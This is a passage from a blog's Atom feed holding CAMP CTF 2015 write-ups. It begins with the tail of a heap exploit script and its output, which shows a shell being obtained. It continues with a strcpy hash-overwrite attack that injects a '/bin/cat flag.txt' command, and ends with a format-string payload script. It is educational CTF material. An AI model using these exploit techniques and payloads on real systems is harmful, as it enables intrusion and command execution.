    s.send('4\n')
    s.send('1\n')
    s.send('3\n')   # code exec much?

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    s.close()
pwn()
</code></pre>

<p>And against the remote binary:</p>

<pre><code class="bash">ubuntu@ubuntu-VirtualBox:~$ python poc.py 
dbg

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
adding second wifi

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter a comment for this DK.
&gt; DK #1 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
libc: 7f912685f000
system: 7f91268a33d0

 Comment: 

DK #1 with wifi @ 0.0000/0.0000:
 Comment: 


Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
deleting second wifi

&gt; Enter DK index: 
&gt; DK #1 successfully deleted.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
shrinking first wifi

&gt; Enter DK index: 
&gt; Editing DK #0:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully saved.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
adding second nowifi

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter a comment for this DK.
&gt; DK #1 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit

&gt; Enter DK index: 
&gt; Editing DK #0:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter the name of SSID #0.
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully saved.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
&gt; Enter DK index: 
&gt; Editing DK #1:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
cat flag.txt
cat: flag.txt: No such file or directory
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd home
ls
challenge
cd cha*
ls
challenge
flag.txt
cat flag.txt
CAMP15_aecbde52de8b1ed16bf62aa772d53a2
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Secret_File]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/"/>
    <updated>2015-08-18T21:35:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file</id>
    <content type="html"><![CDATA[<p>In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-)</p>

<!--more-->


<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ ./secret_file 
AAAA
wrong password!
</code></pre>

<p>Hmm. Let&rsquo;s see what makes this thing tick:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ strings ./secret_file 
/lib64/ld-linux-x86-64.so.2
x]Cm
libcrypto.so.1.0.0
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
SHA256_Final
SHA256_Init
_init
SHA256_Update
_fini
libc.so.6
strcpy
strrchr
puts
__stack_chk_fail
stdin
popen
fgets
fclose
getline
__cxa_finalize
strcmp
__libc_start_main
snprintf
_edata
__bss_start
_end
GLIBC_2.4
GLIBC_2.2.5
AUATUSH
[]A\A]
D$x1
D$xdH3
[]A\A]
D$h1
/bin/catH
 ./secreH
t_data.aH
9387a00eH
D$ H
31e413c5H
D$(H
5af9c08cH
D$0H
69cd119aH
D$8H
b4685ef3H
D$@H
bc8bcbe1H
D$HH
cf821611H
D$PH
19457127H
D$X1
D$hdH3
AWAVA
AUATL
[]A\A]A^A_
%02x
wrong password!
;*3$"
</code></pre>

<p>We see strings like <code>bc8bcbe1H</code>, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let&rsquo;s exploit it!</p>

<p>It gets interesting around this code:</p>

<pre><code>     e8e:   rep stos QWORD PTR es:[rdi],rax
     e91:   lea    rdi,[rbx+0x100]
     e98:   mov    rcx,rsp
     e9b:   movabs rax,0x7461632f6e69622f
     ea5:   mov    QWORD PTR [rsp],rax
     ea9:   movabs rax,0x65726365732f2e20
     eb3:   mov    QWORD PTR [rsp+0x8],rax
     eb8:   movabs rax,0x612e617461645f74
     ec2:   mov    QWORD PTR [rsp+0x10],rax
     ec7:   mov    eax,0x6373
     ecc:   mov    WORD PTR [rsp+0x18],ax
     ed1:   xor    eax,eax
     ed3:   call   a30 &lt;snprintf@plt&gt;
     ed8:   lea    rcx,[rsp+0x20]
     edd:   mov    esi,0x41
     ee2:   movabs rax,0x6530306137383339
     eec:   mov    QWORD PTR [rsp+0x20],rax
     ef1:   lea    rdi,[rbx+0x11b]
     ef8:   movabs rax,0x3563333134653133
     f02:   mov    QWORD PTR [rsp+0x28],rax
     f07:   lea    rdx,[rip+0x106]        # 1014 &lt;_fini+0x10&gt;
     f0e:   movabs rax,0x6338306339666135
     f18:   mov    QWORD PTR [rsp+0x30],rax
     f1d:   movabs rax,0x6139313164633936
     f27:   mov    QWORD PTR [rsp+0x38],rax
     f2c:   movabs rax,0x3366653538363462
     f36:   mov    QWORD PTR [rsp+0x40],rax
     f3b:   movabs rax,0x3165626362386362
     f45:   mov    QWORD PTR [rsp+0x48],rax
     f4a:   movabs rax,0x3131363132386663
     f54:   mov    QWORD PTR [rsp+0x50],rax
     f59:   movabs rax,0x3732313735343931
     f63:   mov    QWORD PTR [rsp+0x58],rax
     f68:   xor    eax,eax
     f6a:   mov    BYTE PTR [rsp+0x60],0x0
     f6f:   call   a30 &lt;snprintf@plt&gt;
     f74:   mov    rax,QWORD PTR [rsp+0x68]
     f79:   xor    rax,QWORD PTR fs:0x28
     f82:   jne    f8a &lt;__cxa_finalize@plt+0x4aa&gt;
     f84:   add    rsp,0x70
     f88:   pop    rbx
     f89:   ret    
</code></pre>

<p>It passes a few strings to the stack. We&rsquo;ll be seeing them later. Let&rsquo;s run the binary in <code>gdb</code>.</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre>

<p>PIE is enabled, so find out the base address of the binary with <code>vmmap</code>. Our input gets processed here:</p>

<pre><code>     b40:   call   ad0 &lt;getline@plt&gt;
     b45:   cmp    rax,0xffffffffffffffff
     b49:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
     b4f:   mov    rdi,QWORD PTR [rsp+0x8]
     b54:   mov    esi,0xa
     b59:   call   a40 &lt;strrchr@plt&gt;
     b5e:   test   rax,rax
     b61:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
     b67:   mov    BYTE PTR [rax],0x0
     b6a:   mov    rsi,QWORD PTR [rsp+0x8]
     b6f:   mov    rdi,r13
     b72:   lea    rbp,[r13+0x15c]
     b79:   lea    rbx,[r13+0x17c]
     b80:   lea    r12,[r13+0x1bc]
     b87:   call   9e0 &lt;strcpy@plt&gt;
</code></pre>

<p>We have an unchecked <code>strcpy</code>. Lovely. Let&rsquo;s see what it will copy where:</p>

<pre><code>gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555556000 r-xp  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555755000 0x0000555555756000 r--p  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555756000 0x0000555555757000 rw-p  /home/bas/bin/ccc/secret_file/secret_file
...
gdb-peda$ b *0x0000555555554000+0xb87
Breakpoint 4 at 0x555555554b87
gdb-peda$ c

...

=&gt; 0x555555554b87:  call   0x5555555549e0 &lt;strcpy@plt&gt;
   0x555555554b8c:  mov    edx,0x100
   0x555555554b91:  mov    rsi,rbp
   0x555555554b94:  mov    rdi,r13
   0x555555554b97:  call   0x555555554dd0
Guessed arguments:
arg[0]: 0x7fffffffe190 --&gt; 0x0 
arg[1]: 0x555555757010 --&gt; 0x41414141 ('AAAA')
</code></pre>

<p>So it will copy our input to the stack. Let&rsquo;s examine the stack:</p>

<pre><code>gdb-peda$ x/200wx 0x7fffffffe190
0x7fffffffe190: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe200: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe210: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe220: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe230: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe240: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe250: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe260: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe270: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe280: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe290: 0x6e69622f  0x7461632f  0x732f2e20  0x65726365
0x7fffffffe2a0: 0x61645f74  0x612e6174  0x39006373  0x61373833
0x7fffffffe2b0: 0x33653030  0x31346531  0x35356333  0x63396661
0x7fffffffe2c0: 0x36633830  0x31646339  0x62613931  0x35383634
0x7fffffffe2d0: 0x62336665  0x63623863  0x63316562  0x31323866
0x7fffffffe2e0: 0x31313136  0x37353439  0x00373231  0x00007fff
0x7fffffffe2f0: 0x00000000  0x00000000  0xf7ffa828  0x00007fff
0x7fffffffe300: 0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
0x7fffffffe310: 0x00000000  0x00000001  0xf7ffe758  0x00007fff
0x7fffffffe320: 0x13742321  0x00000000  0xf7a071ef  0x00007fff
</code></pre>

<p>Nice, what are those bytes at <code>0x7fffffffe290</code>?</p>

<pre><code>gdb-peda$ x/2s 0x7fffffffe290
0x7fffffffe290:  "/bin/cat ./secret_data.asc"
0x7fffffffe2ab:  "9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"
</code></pre>

<p>Hey, that second one looks like the SHA256 hash! We&rsquo;ll be able to overwrite this&hellip; Seeing as it&rsquo;s stored as a string, better set a breakpoint on <code>strcmp()</code> for later&hellip;</p>

<pre><code>     bd5:   call   a80 &lt;strcmp@plt&gt;
</code></pre>

<p>Restarted the binary:</p>

<pre><code>gdb-peda$ b *0x0000555555554000+0xbd5
Breakpoint 2 at 0x555555554bd5
gdb-peda$ c
AAAA

...

=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d")
</code></pre>

<p>OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:</p>

<pre><code>gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

   0x555555554bc5:  jne    0x555555554ba0
   0x555555554bc7:  lea    rsi,[r13+0x17c]
   0x555555554bce:  lea    rdi,[r13+0x11b]
=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;

...

Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")

...

Breakpoint 2, 0x0000555555554bd5 in ?? ()
</code></pre>

<p>And if we do it again, but send 512 * &lsquo;A&rsquo;:</p>

<pre><code>gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

=&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ('A' &lt;repeats 65 times&gt;"\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S'\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
</code></pre>

<p>We&rsquo;ve overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial &amp; error, I could reliably overwrite the hash:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb' | ./secret_file 
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
</code></pre>

<p>What&rsquo;s left now is to exploit it to grab the flag:</p>

<pre><code class="bash">bas@tritonal:~$ nc challs.campctf.ccc.ac 10105
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       ; #e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb
CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Hacker_Level]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level/"/>
    <updated>2015-08-18T21:34:00+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level</id>
    <content type="html"><![CDATA[<p>Easy 200 points.</p>

<!--more-->


<p>We&rsquo;re given a binary and the source. We need to supply a name that will be processed into an integer. The resulting integer should be <code>0xCCC31337</code>. If you look at the function:</p>

<pre><code class="c">static uint32_t level = 0;

...

static void calc_level(const char *name) {
    for (const char *p = name; *p; p++) {
        level *= 257;
        level ^= *p;
    }
    level %= 0xcafe;
}
</code></pre>

<p>Finally, the value for <code>level</code> is modulo&rsquo;d with <code>0xcafe</code>. This means that <code>level</code> can <em>never</em> be the required value <code>0xCCC31337</code>. We&rsquo;ll need to co-opt another section of code to pass the check. This quickly came to mind:</p>

<pre><code class="c">    printf("What's your name? ");
    fgets(name, sizeof name, stdin);

    calc_level(name);

    usleep(150000);
    printf("Hello, ");
    printf(name);
</code></pre>

<p>Excellent. We have a format string vulnerability. After hex-editing the binary to get rid of the <code>usleep()</code> calls, I bruteforced the location of our format string on the stack (starts at position 7). Next, the disassembly of <code>hacker-level</code> shows us where <code>level</code> is at in memory:</p>

<pre><code> 8048620:   cmp    DWORD PTR ds:0x804a04c,0xccc31337
</code></pre>

<p>All I needed to do was to write the correct format string. I came up with:</p>

<pre><code class="python">import struct
def p(x):
    return struct.pack('&lt;L', x)

payload = ""
payload += p(0x804a04c)
payload += p(0x804a04e)
payload += "%4911c%7$hn%47500c%8$hn"

print payload
</code></pre>

<p>Running this against the remote binary using <code>nc</code> gave <code>The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604</code>. Done!</p>
]]></content>
  </entry>
  
</feed>
